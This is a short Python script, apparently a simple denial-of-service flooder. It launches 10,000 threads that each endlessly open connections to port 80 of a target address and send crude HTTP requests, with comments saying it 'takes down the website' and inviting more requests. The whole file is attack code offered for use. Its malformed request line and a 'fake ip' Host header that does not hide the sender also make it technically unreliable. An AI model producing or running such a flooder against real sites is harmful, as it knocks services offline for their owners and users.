import threading

import socket

target = "target ip" #target's ip address

port = 80 #http port, takes down the website

fake_ip = "mask ip" #enter a fake ip you want to use

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1/1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

for i in range(10000): #10k requests. increase as you wish.
    thread = threading.Thread(target = attack)
    thread.start()
